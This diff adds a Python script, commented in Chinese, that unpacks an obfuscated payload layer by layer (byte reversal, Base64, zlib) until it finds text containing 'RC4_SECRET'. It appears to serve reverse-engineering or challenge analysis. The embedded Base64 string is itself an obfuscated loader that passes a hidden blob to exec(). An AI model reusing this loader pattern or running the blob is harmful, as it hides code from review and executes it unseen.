@@ -1,0 +1,52 @@
+import base64
+import zlib
+import re
+
+def decrypt_step_bytes(data_bytes):
+    """在字节层面执行：反转 -> Base64解码 -> Zlib解压"""
+    # 1. 翻转字节流
+    reversed_data = data_bytes[::-1]
+    # 2. Base64 解码
+    b64_decoded = base64.b64decode(reversed_data)
+    # 3. Zlib 解压
+    return zlib.decompress(b64_decoded)
+
+# 你的原始 Payload
+raw_payload = """XyA9IGxhbWJkYSBfXyA6IF9faW1wb3J0X18oJ3psaWInKS5kZWNvbXByZXNzKF9faW1wb3J0X18oJ2Jhc2U2NCcpLmI2NGRlY29kZShfX1s6Oi0xXSkpOwpleGVjKChfKShiJz1jNENVM3hQKy8vdlB6ZnR2OGdyaTYzNWEwVDFyUXZNbEtHaTNpaUJ3dm02VEZFdmFoZlFFMlBFajdGT2NjVElQSThUR3FaTUMrbDlBb1lZR2VHVUFNY2Fyd1NpVHZCQ3YzN3lzK04xODVOb2NmbWpFL2ZPSGVpNE9uZTBDTDVUWndKb3BFbEp4THI5VkZYdlJsb2E1UXZyamlUUUtlRytTR2J5Wm0rNXpUay9WM25aMEc2TmVhcDdIdDZudSthY3hxc3Ivc2djNlJlRUZ4ZkVlMnAzMFlibXl5aXMzdWFWMXArQWowaUZ2cnRTc01Va2hKVzlWOVMvdE8rMC82OGdmeUtNL3lFOWhmNlM5ZUNEZFFwU3lMbktrRGlRazk3VFV1S0RQc09SM3BRbGRCL1VydmJ0YzRXQTFELzljdFpBV2NKK2pISkwxaytOcEN5dktHVmh4SDhETEw3bHZ1K3c5SW5VLzl6dDFzWC9Uc1VSVjdWMHhFWFpOU2xsWk1acjFrY0xKaFplQjhXNTl5bXhxZ3FYSkpZV0ppMm45NmhLdFNhMmRhYi9GMHhCdVJpWmJUWEZJRm1ENmtuR3ovb1B4ZVBUenVqUHE1SVd0OE5abXZ5TTVYRGcvTDhKVS9tQzRQU3ZYQStncWV1RHhMQ2x6Uk5ESEpVbXZ0a2FMYkp2YlpjU2c3VGdtN1VTZUpXa0NRb2pTaStJTklFajVjTjErRkZncEtSWG40Z1I5eXAzL1Y3OVduU2VFRklPNkM0aGNKYzRtd3BrKzA5dDF5dWU0K21BbGJobHhuWE0xUGZrK3NHQm1hVUZFMWtFak9wbmZHbnFzVithdU9xakpnY0RzaXZJZCt3SFBIYXp0NU1WczRySFJoWUJPQjZ5WGp1R1liRkhpM1hLV2hiN0FmTVZ2aHg3RjlhUGpObUlpR3FCVS9oUkZVdU1xQkNHK1ZWVVZBYmQ1cEZEVFpKM1A4d1V5bTZRQUFZUXZ4RytaSkRSU1F5cE9oWEsvTDRlRkZ0RXppdWZaUFN5cllQSldKbEFRc0RPK2RsaTQ2Y24xdTVBNUh5cWZuNHZ3N3pTcWUrVlVRL1JpL0tudjBwUW9XSDFkOWRHSndEZnFtZ3ZuS2krZ05SdWdjZlVqRzczVjZzL3RpaGx0OEIyM0t2bUp6cWlMUHptdWhyMFJGVUpLWmpHYTczaUxYVDRPdmxoTFJhU2JUVDR0cS9TQ2t0R1J5akxWbVNqMmtyMEdTc3FUamxMMmw2Yy9jWEtXalJNdDFrTUNtQ0NUVithSmU0bnB2b0I5OU9NbktuWlI0WXM1MjZtVEZUb1N3YTVqbXhCbWtSWUNtQTgyR0ZLN2FrNmJJUlRmRE1zV0dzWnZBRVh2M1BmdjVOUnpjSUZOTzN0YlFrZUIvTElWT1c1TGZBa21SNjgvNnpyTDBEWm9QanpGWkk1VkxmcTBydjlDd1VlSmtSM1BIY3VqKytkL2xPdms4L2gzSHpTZ1lUR0N3bDF1ano4aDRvVWlQeUdUNzROamJZN2ZKOHZVSHFOeitaVmZPdFZ3L3ozUk11cVNVekVBS3JqY1UyRE5RZWhCMG9ZN3hJbE9UOXU5QlQ0Uk9vREZvKzVaRjZ6Vm9IQTRlSWNrWFVPUDN5cFF2NXBFWUcrMHBXNE15SG1BUWZzT2FXeU1kZk1vcWJ3L005b0ltZEdLZEt5MVdxM2FxK3QreHV5VmROQVFNaG9XMkE3elF6b2I4WEdBM0c4VnVvS0hHT2NjMjVIQ2IvRlllU3hkd3lJZWRBeGtsTExZTUJIb2pUU3BEMWRFeG96ZGk4OUdpa2h6MzMwNW5kVG1FQ3YwWm9VT0hhY25xdFVVaEpseTdWZ3ZYK0psYXdBWTlvck5QVW1aTTdRS2JkT2tUZi9vOGFRbFM1RmUveFFrT01KR200TlhxTGVoaVJJYjkyNXNUZlZ4d29OZlA1djFNR2xhcllNaWZIbDJyRXA1QzcxaXBGanBBR2FFcDluUmowSmdFYTRsU1R1WWVWWHdxYlpRVDNPZlF2Z3QvYkhKbEFndXFTV3lzR2hxaElUSllNNlQxMG03MUppd2ZRSDVpTFhINVhiRms1M1FHY0cyY0FuRnJXeTcweEV2YWJtZjB1MGlrUXdwVTJzY1A4TG9FYS9DbEpuUFN1V3dpY01rVkxya1pHcW5CdmJrNkpUZzdIblQwdkdVY1Y2a2ZmSUw2Q0szYkUxRnkwUjZzbCtVUG9ZdmprZ1NJM1ViZkQ2N2JSeEl4ZWdCcFlUenlDRHpQeXRTRSthNzdzZHhzZ2hMcFVDNWh4ejRaZVhkeUlyYm1oQXFRdzVlRW5CdUFTRTVxVE1Ka1RwLy9oa3krZFQycGNpT0JZbi9BQ1NMeHByTFowQXkxK3pobCtYeVY5V0ZMNE5nQm9IMzRidmt4SDM2bmN0c3pvcFdHUHlkMTRSaVM0ZDBFcU5vY3F2dFd1M1l4a05nUCs4Zk0vZC9CMGlreEt4aC9HamttUVhhU1gvQis0MFU0YmZTYnNFSnBWT3NUSFR5NnUwTnI2N1N3N0J2Und1VnZmVDAvOGo3M2dZSEJPMmZHU0lKNDdBcllWbTIrTHpSVDBpSDVqN3lWUm1wdGNuQW44S2t4SjYzV0JHYjd1M2JkK0QrM3lsbm0xaDRBUjdNR042cjZMeHBqTmxBWDExd2EvWEIxek44Y1dVTm5DM1ZjemZ3VUV3UGZpNWR5bzluRUM1V085VW03OFdLUnJtM2M0OEl2VFVoZ2ROZVFFRG9zSWZoTVNtaWtFbHVRWDhMY0NSY0s5ZVVUODVidnI1SjVyekViK0R1aUdZeURGRzdQWmVmdkliM3czM3UycTh6bHhsdFdDU3RjNU80cThpV3JWSTd0YVpIeG93VHc1ekpnOVRkaEJaK2ZRclF0YzB5ZHJCbHZBbG5ZMTB2RUNuRlVCQSt5MWxXc1ZuOGNLeFVqVGRhdGk0QUYzaU0vS3VFdFE2Wm44Ykk0TFl3TWxHbkNBMVJHODhKOWw3RzRkSnpzV3I5eE9pRDhpTUkyTjFlWmQvUVV5NDNZc0lMV3g4MHlpQ3h6K0c0YlhmMnFOUkZ2Tk9hd1BTbnJwdjZRMG9GRVpvamx1UHg3Y09VMjdiQWJncHdUS28wVlV5SDZHNCt5c3ZpUXpVN1NSZDUxTEdHM1U2Y1QwWURpZFFtejJld3Ria2tLY0dWY1N5WU9lQ2xWNkNSejZiZEYvR20zVDIrUTkxNC9sa1piS3gxOVduWDc4cit4dzZicGp6V0xyMEUxZ2puS0NWeFcwWFNud2UraUc5ZGtHOG5DRmZqVWxoZFRhUzFnSjdMRnNtVWpuOHUvdlJRYlJMdy95NjZJcnIveW5LT0N6Uk9jZ3JuREZ4SDN6M0pUUVFwVGlEcGV5elJzRjRTbkdCTXY1SGJyK2NLN0xrSkhITWpDM1c3ZFRtT0JwZm9XTVZFTGFMK1JrcVdZdjBDcFc1cUVOTGxuT1BCckdhR05lSVphaHpibnJ1RVBJSVhHa0d6MWZFNWQ0Mk1hS1pzQ1VZdDF4WGlhaTkrY2JLR2ovZDBsSUNxN3VjN2JSaEVCeDQ2RHlCWFR6MWdmSm5UMnVyNng0QXZiNXdZMnBjWXJjRDJPUjZBaWtNdm0yYzBiaGFiSkI2bzBEaE9OSjRsQ3htS2RHQnp1d3J0czF1MEQyeXVvMzd5TExmc0dEdXllcE53OGx5VE5jMm55aENWQmZXMjNEbkJRbVdjMVFMQ29ScHBWaGpLWHdPcE9ES084UjhZSG5RTStyTGs2RU9hYkNkR0s1N2lSek1jVDN3YzQzNmtWbUhYRGNJMFpzWUdZNWFJQzVEYmRXalV0Mlp1VTBMbXVMd3pDVFM5OXpoT29POERLTnFiSzRiSU5MeUFJMlg5Mjh4aWIraG1JT3FwM29TZ0MyUGRGYzh5cXRoTjlTNTVvbXRleDJ4a0VlOENZNDhDNno0SnRxVnRxaFBRV1E4a3RlNnhsZXBpVllDcUliRTJWZzRmTi8vTC9mZi91Ly85cDRMejd1cTQ2eVdlbmtKL3g5MGovNW1FSW9yczVNY1N1Rmk5ZHlneXlSNXdKZnVxR2hPZnNWVndKZScpKQ=="""
+
+try:
+    # 第一层：基础 Base64 解码，得到的是包含 exec 的字节流
+    current_content = base64.b64decode(raw_payload)
+    layer = 1
+    
+    while True:
+        # 使用字节正则匹配 b'...'
+        # 注意这里匹配的是字节流中的内容
+        match = re.search(rb"b'([^']+)'", current_content)
+        if not match:
+            # 如果没匹配到，尝试直接 decode 看看是不是已经到明文了
+            try:
+                final_text = current_content.decode('utf-8', errors='ignore')
+                if "RC4_SECRET" in final_text:
+                    print("\n" + "="*30 + "\n找到最终源码！\n" + "="*30)
+                    print(final_text)
+                    break
+            except:
+                pass
+            break
+            
+        inner_bytes = match.group(1)
+        # 执行解密
+        current_content = decrypt_step_bytes(inner_bytes)
+        print(f"成功解密第 {layer} 层...")
+        layer += 1
+        
+        # 检查是否包含关键字
+        if b"RC4_SECRET" in current_content:
+            print("\n" + "="*30 + "\n找到最终源码！\n" + "="*30)
+            # 使用 errors='ignore' 防止最后打印时因为个别特殊字符报错
+            print(current_content.decode('utf-8', errors='ignore'))
+            break
+
+except Exception as e:
+    print(f"解密过程中断: {e}")
